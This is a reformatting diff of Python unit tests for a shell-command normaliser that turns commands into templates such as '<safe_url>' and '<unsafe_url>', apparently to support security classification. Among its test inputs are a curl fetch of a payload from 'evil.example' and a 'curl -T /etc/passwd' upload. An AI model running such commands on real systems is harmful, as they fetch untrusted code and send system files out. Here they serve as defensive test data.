@@ -19,15 +19,24 @@ ENV = {"HOME": "/home/test"}
         ("echo $HOME", "echo <home_path>"),  # $HOME expands to known env value → path
         ("ls ~/Downloads", "ls <home_path>"),
         ("ls *.py", "ls <glob>"),
-        ("echo hello > ./out.txt", "echo hello > <file_arg>"),  # B3: redirect destination → <file_arg>
+        (
+            "echo hello > ./out.txt",
+            "echo hello > <file_arg>",
+        ),  # B3: redirect destination → <file_arg>
         # URLs — flags stripped for curl (in SAFE_FLAG_STRIP_VERBS)
         ("curl -s https://api.github.com/repos/x/y", "curl <safe_url>"),
         ("curl -s https://evil.example/payload", "curl <unsafe_url>"),
         ("curl -s ftp://example.com/x", "curl <unsafe_url>"),
         # Pipes — safe pipe-filter segments collapsed to <safe_pipe>
-        ("cat /tmp/x.json | jq '.foo'", "cat <file_arg> | <safe_pipe>"),  # cat READ_ONLY → <file_arg>
+        (
+            "cat /tmp/x.json | jq '.foo'",
+            "cat <file_arg> | <safe_pipe>",
+        ),  # cat READ_ONLY → <file_arg>
         ("ls -la | head -n 20", "ls | <safe_pipe>"),  # ls flags stripped + head collapsed
-        ("find /tmp -name '*.log' | xargs rm", "find <file_arg> <arg> | xargs rm"),  # -name stripped; find READ_ONLY → <file_arg>
+        (
+            "find /tmp -name '*.log' | xargs rm",
+            "find <file_arg> <arg> | xargs rm",
+        ),  # -name stripped; find READ_ONLY → <file_arg>
         # Compound chains
         (
             "mkdir -p ./build && cd ./build && cmake ..",
@@ -100,7 +109,10 @@ ENV = {"HOME": "/home/test"}
             "curl <unsafe_url>",
         ),
         # --- B1: curl -o/-O collapse to <file_arg> ---
-        ("curl -sL https://actions.githubusercontent.com/x -o /tmp/x", "curl <safe_url> <file_arg>"),
+        (
+            "curl -sL https://actions.githubusercontent.com/x -o /tmp/x",
+            "curl <safe_url> <file_arg>",
+        ),
         ("curl -sL https://actions.githubusercontent.com/x -o ./x", "curl <safe_url> <file_arg>"),
         # curl -T (upload) must NOT collapse path to <file_arg> — preserved security signal
         ("curl -T /etc/passwd https://api.github.com/upload", "curl -T <etc_path> <safe_url>"),
@@ -121,7 +133,10 @@ ENV = {"HOME": "/home/test"}
         ("curl -sL https://docs.conda-forge.org/foo", "curl <safe_url>"),
         ("curl -sL https://pypi.org/project/numpy", "curl <safe_url>"),
         ("curl -sL https://pypi.python.org/simple/numpy", "curl <safe_url>"),
-        ("curl -sL https://raw.githubusercontent.com/conda-forge/feedstock/main/recipe.yaml", "curl <safe_url>"),
+        (
+            "curl -sL https://raw.githubusercontent.com/conda-forge/feedstock/main/recipe.yaml",
+            "curl <safe_url>",
+        ),
         ("curl -sL https://docs.pixi.sh/latest/", "curl <safe_url>"),
         # --- B3: redirect-destination collapse ---
         # Output redirect with each path category → <file_arg>
@@ -145,9 +160,9 @@ ENV = {"HOME": "/home/test"}
 )
 def test_normalize_template(raw: str, expected_template: str) -> None:
     result = normalize(raw, CWD, env=ENV)
-    assert (
-        result.template == expected_template
-    ), f"\nraw:      {raw!r}\nexpected: {expected_template!r}\nactual:   {result.template!r}"
+    assert result.template == expected_template, (
+        f"\nraw:      {raw!r}\nexpected: {expected_template!r}\nactual:   {result.template!r}"
+    )
 
 
 def test_segments_for_pipe() -> None:
@@ -215,9 +230,7 @@ def test_wc_after_ls_chain() -> None:
     assert len(segs) == 2, f"Expected 2 segments, got {len(segs)}: {segs}"
     wc_seg = segs[1]
     assert wc_seg.verb == "wc", f"Expected verb='wc', got {wc_seg.verb!r}"
-    assert wc_seg.template == "wc <file_arg>", (
-        f"Expected 'wc <file_arg>', got {wc_seg.template!r}"
-    )
+    assert wc_seg.template == "wc <file_arg>", f"Expected 'wc <file_arg>', got {wc_seg.template!r}"
 
 
 def test_value_flag_order_invariance() -> None:
@@ -314,9 +327,7 @@ def test_fd_redirect_untouched() -> None:
     set (`>`, `>>`), so the B3 pass never fires and no path placeholder is emitted.
     """
     r = normalize("cmd 2>&1", CWD, env=ENV)
-    assert "<file_arg>" not in r.template, (
-        f"fd-redirect collapsed unexpectedly: {r.template!r}"
-    )
+    assert "<file_arg>" not in r.template, f"fd-redirect collapsed unexpectedly: {r.template!r}"
     # Actual normalized form — document the tokenization behaviour
     assert r.template == "cmd <n> >& <n>", f"Unexpected: {r.template!r}"
 
@@ -330,17 +341,13 @@ def test_redirect_and_fd_redirect_combined() -> None:
 
 def test_curl_redirect_destination_end_to_end() -> None:
     """curl URL > /tmp/x produces curl <safe_url> > <file_arg>."""
-    r = normalize(
-        "curl https://api.github.com/repos/x/y > /tmp/x", CWD, env=ENV
-    )
+    r = normalize("curl https://api.github.com/repos/x/y > /tmp/x", CWD, env=ENV)
     assert r.template == "curl <safe_url> > <file_arg>", f"Unexpected: {r.template!r}"
 
 
 def test_curl_redirect_with_chain() -> None:
     """curl URL > ./x && wc -l ./x: redirect collapses, wc B2 collapses."""
-    r = normalize(
-        "curl https://api.github.com/repos/x/y > ./x && wc -l ./x", CWD, env=ENV
-    )
+    r = normalize("curl https://api.github.com/repos/x/y > ./x && wc -l ./x", CWD, env=ENV)
     assert r.template == "curl <safe_url> > <file_arg> && wc <file_arg>", (
         f"Unexpected: {r.template!r}"
     )
@@ -352,16 +359,10 @@ def test_grep_with_redirect_both_collapse() -> None:
     `foo` is a bare word (no special classification) so it stays literal.
     """
     r = normalize("grep foo /tmp/in > /tmp/out", CWD, env=ENV)
-    assert r.template == "grep foo <file_arg> > <file_arg>", (
-        f"Unexpected: {r.template!r}"
-    )
+    assert r.template == "grep foo <file_arg> > <file_arg>", f"Unexpected: {r.template!r}"
 
 
 def test_curl_safe_domain_redirect_roundtrip() -> None:
     """Seed roundtrip: curl safe-domain URL > /tmp/x matches expected template."""
-    r = normalize(
-        "curl -sL https://dev.azure.com/foo > /tmp/x", CWD, env=ENV
-    )
-    assert r.template == "curl <safe_url> > <file_arg>", (
-        f"Unexpected: {r.template!r}"
-    )
+    r = normalize("curl -sL https://dev.azure.com/foo > /tmp/x", CWD, env=ENV)
+    assert r.template == "curl <safe_url> > <file_arg>", f"Unexpected: {r.template!r}"
